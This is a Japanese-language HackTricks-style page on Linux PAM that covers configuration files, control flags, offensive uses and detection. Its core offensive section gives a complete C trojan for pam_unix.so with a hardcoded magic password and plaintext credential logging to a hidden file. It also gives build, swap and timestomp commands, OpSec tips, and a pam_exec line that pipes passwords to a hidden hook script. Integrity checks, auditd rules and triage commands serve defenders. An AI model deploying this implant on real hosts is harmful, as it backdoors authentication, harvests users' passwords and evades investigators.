# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### 基本情報

**PAM (Pluggable Authentication Modules)** は、**コンピューターサービスへのアクセスを試みるユーザーの身元を確認し**、さまざまな基準に基づいてアクセスを制御するセキュリティ機構です。デジタルの門番のようなもので、許可されたユーザーだけが特定のサービスを利用できるようにし、システムの過負荷を防ぐために利用を制限することもあります。

#### 設定ファイル

- **Solaris** は従来の集中管理ファイル `/etc/pam.conf` をサポートしていますが、現在のガイダンスでは `/etc/pam.d` 配下のサービスファイルが推奨されています。<sup>[[10]](#references)</sup>
- **Linuxシステム** ではディレクトリ方式が推奨されており、サービス固有の設定を `/etc/pam.d` 内に保存します。たとえば、loginサービスの設定ファイルは `/etc/pam.d/login` にあります。<sup>[[1]](#references)</sup>

loginサービスのPAM設定例は、次のようになります。

```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```

#### **PAM 管理 realm**

これらの realm（管理グループ）には **auth**、**account**、**password**、**session** があり、それぞれ認証およびセッション管理プロセスの異なる側面を担当します。<sup>[[1]](#references)</sup>

- **Auth**: 多くの場合、パスワードを求めてユーザーの本人確認を行います。
- **Account**: グループへの所属や時間帯による制限などの条件を確認し、アカウントを検証します。
- **Password**: パスワードの更新を管理し、複雑さのチェックや辞書攻撃の防止などを行います。
- **Session**: ディレクトリのマウントやリソース制限の設定など、サービスセッションの開始時または終了時の処理を管理します。

#### **PAM モジュールの制御フラグ**

制御フラグは、モジュールが成功または失敗にどう応答するかを定め、認証プロセス全体に影響します。以下の種類があります。<sup>[[1]](#references)</sup>

- **Required**: 必須モジュールが失敗すると最終的に失敗となりますが、その前に後続のすべてのモジュールがチェックされます。
- **Requisite**: 失敗すると、プロセスは直ちに終了します。
- **Sufficient**: それ以前の `required` モジュールが失敗していなければ、成功時に直ちに処理を返し、同じ管理グループ内の残りのモジュールをスキップします。
- **Optional**: スタック内にこのモジュールしかない場合に限り、失敗の原因になります。

#### 重要な攻撃上の意味

PAM を分析または変更するときは、**ルールを挿入する場所**によって、どのスタックがそのルールを読み込むかが決まります。<sup>[[1]](#references)[[13]](#references)</sup>

- `include` と `substack` は別のファイルからルールを読み込むため、`sshd` の編集は SSH にしか影響しない場合があります。一方、`system-auth`、`common-auth`、その他の共有スタックを編集すると、複数のサービスに一度に影響する可能性があります。<sup>[[1]](#references)[[13]](#references)</sup>
- PAM は `[success=1 default=ignore]` のような角括弧付きの制御指定にも対応しています。これを悪用すれば、`pam_unix.so` を目立つ形で置き換えずに、独自チェックの成功後に**1つ以上のモジュールをスキップ**できます。<sup>[[1]](#references)</sup>
- `module-path` は**絶対パス**（`/usr/lib/security/pam_custom.so`）にも、PAM モジュールのデフォルトディレクトリからの**相対パス**にもできます。最近の Linux システムでは、実際のディレクトリは `/lib/security`、`/lib64/security`、`/usr/lib/security`、または `/usr/lib/x86_64-linux-gnu/security` のような multiarch パスであることがよくあります。<sup>[[1]](#references)[[14]](#references)</sup>

オペレーター向けの要点: パッチを適用する前に、必ず**サービスの全体的な呼び出し関係**を把握してください。たとえば、一部のディストリビューションでは `sshd -> password-auth -> system-auth`、別のディストリビューションでは `sshd -> system-remote-login -> system-login -> system-auth` となっています。同じ1行の implant でも、意図した範囲を大きく超えて影響が及ぶ可能性があります。<sup>[[1]](#references)[[13]](#references)</sup>

独自の `auth` モジュールは、アカウントのパスワード入力後に `sudo` へ対話型の challenge を追加する場合があります。challenge を手動で確認する前に、実際に適用される `/etc/pam.d/sudo` スタック、include されるポリシー、モジュールの引数、参照されるローカルデータファイルの権限を調べてください。challenge の単語リストを読み取れるだけでは、パスワードチェックを回避できず、sudoers の許可も作成されません。特権への移行には、正しいアカウント認証、すべての必須 PAM 手順の完了、root 権限で実行可能な sudo ルールが引き続き必要です。自動化された列挙で challenge を起動しないでください。

旧版 Ubuntu の [`pam_motd` ownership flaw (CVE-2010-0832)](https://ubuntu.com/security/cve-2010-0832) については、実際の `libpam-modules` ビルドと、ログインサービスが影響を受ける session モジュールを呼び出すかどうかを確認してください。Ubuntu は 9.10 では **1.1.0-2ubuntu1.1**、10.04 LTS では **1.1.1-2ubuntu5** で修正しました。他のリリースやベンダーによる backport については、それぞれのパッケージを評価する必要があります。報告された攻撃経路では、呼び出し元が自身のホームディレクトリにある `.cache` をシンボリックリンクに置き換えた後、PAM ログインを発生させる必要がありました。これにより、旧モジュールが保護対象の所有者を変更しました。`.cache` エントリ、`pam_motd.so` の行、または古いカーネルバージョンだけでは、影響を受けることの根拠にはなりません。ファイルを置き換えたりログインを開始したりせずに、ホームディレクトリを制御できるか、実際に使用されるモジュールのバージョン、ログイン経路の到達可能性、シンボリックリンクの処理、対象ファイルの権限を確認してください。[Ubuntu のセキュリティ告知](https://ubuntu.com/security/notices/USN-959-1)を参照してください。

#### 例のシナリオ

複数の auth モジュールを使用する構成では、処理は厳密な順序で進みます。`pam_securetty` モジュールがログイン端末を未許可と判断すると、root ログインは拒否されますが、同モジュールが "required" であるため、すべてのモジュールの処理は続行されます。`pam_env` は環境変数を設定し、ユーザーの利便性を高めることがあります。`pam_ldap` と `pam_unix` は連携してユーザーを認証します。`pam_unix` は以前に提供されたパスワードを使用しようとするため、認証方法の効率性と柔軟性が向上します。<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## サービススタックにおける `pam_permit`

`pam_permit.so` は PAM チェックに成功を返します。権限の低いユーザーがサービスの実効 PAM ポリシーを変更できる場合、認証スタックを短絡させる制御フラグとともにこのモジュールを挿入すると、そのサービスのパスワードチェックを取り除ける可能性があります。`sudo` の場合は、影響を受けるサービスを判断する前に、`/etc/pam.d/sudo` と、include される `common-auth` または `system-auth` ファイルを確認してください。PAM 認証をバイパスしても、新たな sudoers ルールが付与されるわけではありません。ユーザーには、要求されたコマンドを実行する権限が引き続き必要です。単一の `sufficient pam_permit.so` 行が常に成功すると決めつけず、ルールの順序と、それ以前の `required` モジュールの失敗を確認してください。

## PAM の Backdooring – `pam_unix.so` の Hook

価値の高い Linux 環境でよく使われる古典的な persistence 手法は、**正規の PAM ライブラリを trojanised drop-in に置き換えること**です。PAM スタックが `pam_unix.so` を読み込むホストでは、SSH またはコンソール認証によって、その `pam_sm_authenticate()` エントリーポイントが呼び出される可能性があります。悪意のある置き換えモジュールは、認証情報を取得したり、*magic* password bypass を実装したりできます。<sup>[[2]](#references)[[11]](#references)</sup>

### コンパイルのチートシート
以下の例では、Linux-PAM の `pam_sm_authenticate()` サービスエントリーポイントと `pam_get_authtok()` を使って、認証トークンにアクセスします。<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>サンプル `pam_unix.so` trojan</summary>

```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
    if (real_module) return 0;
    real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
    if (!real_module) return -1;
    orig_auth = dlsym(real_module, "pam_sm_authenticate");
    orig_setcred = dlsym(real_module, "pam_sm_setcred");
    return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL, *pass = NULL;
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

    /* Magic pwd → immediate success */
    if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

    /* Credential harvesting */
    if (user && pass) {
        int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
        if (fd >= 0) {
            dprintf(fd, "%s:%s\n", user, pass);
            close(fd);
        }
    }

    /* Forward to the renamed original module. */
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_setcred(pamh, flags, argc, argv);
}
```

</details>

コンパイルしてステルス置換します（置換/timestomp のパターンは Unit 42 によって文書化されています）。ラッパーにハードコードされたバックアップパスと、以下のコマンドの両方を、ターゲットの実際の PAM モジュールディレクトリに合わせて調整してください。<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```

### OpSecのヒント
1. **アトミックな上書き** – 完全なライブラリを一時ファイルに書き込み、所定の場所にrenameして、認証モジュールが部分的に書き込まれた状態で残るのを防ぎます。
2. Unit 42のAuthDoor分析で`/usr/bin/.dbus.log`のようなパスが確認されているため、これも有用なhunting indicatorです。<sup>[[2]](#references)</sup>
3. PAM stackが想定するentry point（例：`pam_sm_authenticate`や`pam_sm_setcred`）を維持し、他の管理操作が引き続き機能するようにします。<sup>[[11]](#references)[[18]](#references)</sup>

### 検出
package-integrity checkでは、RPMはインストール済みファイルのメタデータを検証し、`debsums -s`はchecksumエラーを報告します。また、triage block内の`dpkg -S`はパッケージの所有者を照会し、audit watch構文はパスへの書き込みや属性変更を記録します。<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* `pam_unix.so`のMD5/SHA256をdistro packageのものと比較します。
* `rpm -V pam`または`debsums -s libpam-modules`を使い、手動でhashを計算せずに置き換えられたライブラリを検出します。
* `/lib/security/`以下にworld-writableなファイルや、通常とは異なる所有者がないか確認します。
* `auditd` rule: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`。
* PAM configに予期しないmoduleがないかgrepします：`grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`。

この`pam_` grepでは、別の`.so` basenameを持つcustom moduleを見落とします。`/etc/pam.d`（および使用されている場合は`/etc/pam.conf`）にある、**有効な**`auth`、`account`、`password`、`session`行を確認してください。control flagと、includeされているstackも含めて確認します。通常のパスワード確認より前に、見慣れないmoduleが`auth sufficient`として置かれている場合は、パッケージの所有者とbinaryを確認する必要があります。[PAMのcontrol構文](https://man7.org/linux/man-pages/man5/pam.d.5.html)では、その部分のstackを早期に終了させることができます。module名、異常なtimestamp、または`nodelay` optionだけでは、bypassの証拠にはなりません。動作からtiming leakが疑われる場合は、まず実装とserviceへの到達可能性を調査してください。通常の列挙で認証の推測を繰り返し送信してはいけません。

### 迅速なtriageコマンド（侵害後またはthreat hunting用）
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
    dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```

### 永続化のために`pam_exec`を悪用する
`pam_unix.so`を置き換える代わりに、`/etc/pam.d/sshd`へ`pam_exec`の行を追加するという、より控えめな方法があります。これにより、通常のスタックをそのまま維持しつつ、そのPAM行に到達した呼び出しでヘルパーが実行されます。<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` は、`PAM_USER`、`PAM_RHOST`、`PAM_SERVICE`、`PAM_TTY`、`PAM_TYPE` などの環境変数で PAM メタデータを受け取ります。`expose_authtok` を指定すると、ヘルパーは `auth` または `password` フェーズ中に、パスワードを `stdin` から最大 `PAM_MAX_RESP_SIZE` バイト読み取れます。実 UID ではなく実効 UID でヘルパーを実行するには、`seteuid` を追加します。<sup>[[4]](#references)</sup>

実用上の注意点は、`pam_exec` のモジュールタイプと、ドキュメントに記載されている `type=` フィルターに従います。<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` は、ソケットの再オープンやデタッチされたデーモンの起動など、**ログイン後の処理**に適しています。
- `auth optional pam_exec.so quiet expose_authtok ...` は、セッションが開く前に実行されるため、**認証情報の取得**で一般的に使われます。
- `type=session` または `type=auth` を使うと、実行を特定の PAM フェーズに限定し、不要な二重実行を避けられます。

権限の確認では、現在のユーザーが書き込み可能な絶対パス指定の `pam_exec.so` ヘルパーは、ファイルに append-only (`a`) 属性が付いていても候補になります。[この属性は追記を許可するため](https://man7.org/linux/man-pages/man1/chattr.1.html)、シェルスクリプトの後続の動作を変えるには十分な場合があります。まず、PAM サービスとイベントが実際にその行に到達すること、ヘルパーとその親パスが信頼できること、コマンドがより高い権限を持つ ID で実行されることを確認してください。[`seteuid` は、どの PAM UID が使われるかを変更します](https://man7.org/linux/man-pages/man8/pam_exec.8.html)。書き込み可能なファイルや `lsattr` の結果だけでは、特権実行の証明にはなりません。

### ディストリビューションのツールによる上書きを回避する: `authselect`

`authselect` を使用する RHEL および Fedora 系のシステムでは、`/etc/pam.d/system-auth` や `/etc/pam.d/password-auth` などの生成ファイルを直接編集すると、**`authselect` によって上書きされる**可能性があります。変更を保持するには、通常、`/etc/authselect/custom/<profile>/` にある有効なカスタムプロファイルを修正し、その後、再選択します。<sup>[[5]](#references)[[19]](#references)</sup>

root 権限がある場合の一般的な手順:<sup>[[5]](#references)</sup>

```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```

これは攻撃とトリアージの両方で重要です。`/etc/pam.d/system-auth` に `Generated by authselect` と `Do not modify this file manually` のバナーが含まれている場合、実際の永続化ポイントは `/etc/pam.d/` ではなく `/etc/authselect/custom/` にある可能性があります。<sup>[[5]](#references)</sup>

### 実環境で確認された最近のtradecraft

2025年の**Plague** Linuxバックドアに関する最近の報告では、同じ基本アイデアをさらに発展させた手法が示されました。**static bypass password**を備えた悪意のあるPAMコンポーネントに加え、SSH関連の環境変数とシェル履歴（`HISTFILE=/dev/null`）を消去し、ログイン後にセッションの痕跡を減らします。<sup>[[3]](#references)</sup> これは有用なハンティングパターンです。バックドアのロジックはPAM内に存在する一方、ステルス性を高める痕跡は認証成功**後にのみ**現れる場合があるためです。


## References

- [1] [pam.conf(5) / pam.d(5) - Linux-PAM マニュアル](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [秘密工作員の手引き：世界の通信ネットワークへの侵入 - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague：Linux向けに新たに発見されたPAMベースのバックドア](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Linux-PAM マニュアル](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [authselectを使用したユーザー認証の設定 - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Debian Manpages](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Linuxマニュアルページ](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Debian Manpages](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Oracle Solaris 11.4での認証管理](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Linux-PAM マニュアル](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Linux-PAM マニュアル](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [システムレベル認証ガイド - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Ubuntuパッケージファイル一覧：libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Linux-PAM マニュアル](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Linux-PAM マニュアル](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Debian Manpages](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Linux-PAM マニュアル](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [変更点/Authselectを必須にする - Fedora Project Wiki](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
